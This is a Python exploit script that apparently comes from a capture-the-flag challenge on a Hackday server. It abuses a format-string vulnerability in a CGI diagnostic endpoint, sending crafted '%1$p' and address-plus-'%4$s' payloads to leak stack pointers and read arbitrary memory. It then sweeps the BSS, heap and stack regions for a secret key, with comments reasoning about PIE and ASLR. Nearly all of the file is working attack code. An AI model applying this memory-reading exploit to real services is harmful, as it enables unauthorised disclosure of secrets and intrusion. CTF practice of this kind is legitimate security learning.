#!/usr/bin/env python3
import urllib.request
import urllib.parse
import struct

BASE = "http://millenium-messenger.hackday.fr:8000"

def send_msg_raw(body_bytes):
    encoded = urllib.parse.quote(body_bytes, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=15) as resp:
            return resp.read()
    except Exception as e:
        return b""

def extract_diag_bytes(raw):
    marker = b'DIAG '
    idx = raw.find(marker)
    if idx >= 0:
        return raw[idx+5:].rstrip(b'\r\n')
    return b''

# Let's try to read /proc/self/maps by using the format string to read it
# Actually we can't do file reads with format strings
# But we can try to find the HEAP address

# The key insight: CGI process DOES load the key file, but we need:
# 1. The heap address where the key is stored
# 2. To read it byte by byte

# Strategy: Use the leaked stack address (pos 1) to find where the 
# binary's BSS/heap is. In 32-bit Linux ELF, heap is after BSS.
# If the binary loaded the key into a global buffer (BSS), 
# it would be at a fixed address (no ASLR for PIE-disabled binaries)

# Let's check: does the binary have ASLR? 
# Each request, the stack address (pos 1) changes - so yes, stack has ASLR
# But if PIE is disabled, the .bss/.data stays at fixed addresses

# The global at position 3 (0x8049530) is always the same address
# This confirms PIE is DISABLED - the binary is loaded at fixed base 0x8048000

# In a typical ELF: 
# .text starts at 0x08048000
# .data follows .text
# .bss follows .data (uninitialized globals)
# Heap starts after BSS

# The key is loaded into memory at startup via fread()
# If stored in a global array: it's in .bss at a fixed address
# If stored in heap via malloc: we need the heap address

# Let's find the key by using format string to scan the HEAP
# The heap is typically just after the BSS section
# since 0x8049530 is in .data, the BSS starts just after and heap after that

# Try addresses after 0x804a000 (typical BSS end and heap start)
print("=== Scanning potential heap/BSS for key ===")
found = []
for addr in range(0x804a000, 0x804f000, 4):
    addr_bytes = struct.pack('<I', addr)
    if b'\x00' in addr_bytes:
        continue
    payload = addr_bytes + b'%4$s'
    raw = send_msg_raw(payload)
    content = extract_diag_bytes(raw)
    if content and content != b'(null)' and len(content) >= 4:
        try:
            text = content.decode('ascii')
            if all(32 <= ord(c) < 127 for c in text) and len(text) >= 4:
                print(f"  0x{addr:08x}: {repr(text[:60])}")
                found.append((addr, text))
        except:
            # Not ASCII but has content - could be binary key
            if len(content) >= 10 and all(b < 128 for b in content[:8]):
                print(f"  0x{addr:08x}: raw {content[:16].hex()}")

print(f"\nFound {len(found)} ASCII strings in 0x804a000-0x804f000")

# Also let's try to read /proc/self/cmdline via a trick
# If the binary passes the key as a command line arg or env var,
# we might find it in /proc/self/cmdline or environ
# But we can't open files directly with format string...

# Wait - the ENVIRONMENT VARIABLES are on the stack!
# In CGI, environment is passed on the stack but ABOVE our data
# Let's try reading HIGH on the stack (env vars are at high addresses)
print()
import time
print("=== Try reading high stack positions (env vars area) ===")
# Stack grows DOWN, env vars are at the TOP of the stack space
# With 32-bit Linux stack at ~0xffffffff, env starts at ~0xffffe000
# But we can't directly reference them... unless we can find a valid pointer

# Get current stack pointer
import re
def send_msg(body_str):
    encoded = urllib.parse.quote(body_str, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=15) as resp:
            return resp.read().decode('latin-1', errors='replace')
    except Exception as e:
        return f"ERROR: {e}"

result = send_msg("%1$p")
match = re.search(r'0x([0-9a-f]+)', result)
if match:
    buf_addr = int(match.group(1), 16)
    print(f"Buffer address: 0x{buf_addr:08x}")
    
    # Stack grows down, so env vars are at higher addresses
    # Scan upward from buf_addr
    print(f"Scanning upward from 0x{buf_addr:08x}...")
    for offset in range(0, 0x4000, 4):
        addr = buf_addr + offset
        addr_bytes = struct.pack('<I', addr)
        if b'\x00' in addr_bytes:
            continue
        payload = addr_bytes + b'%4$s'
        raw = send_msg_raw(payload)
        content = extract_diag_bytes(raw)
        if content and len(content) >= 4:
            try:
                text = content[:60].decode('ascii')
                if all(32 <= ord(c) < 127 for c in text) and len(text) >= 8:
                    print(f"  0x{addr:08x} (+{offset:04x}): {repr(text[:60])}")
                    if any(kw in text.lower() for kw in ['key', 'epoch', 'secret', 'Y2K', 'msn']):
                        print(f"  *** INTERESTING ***")
            except:
                pass
        time.sleep(0.01)
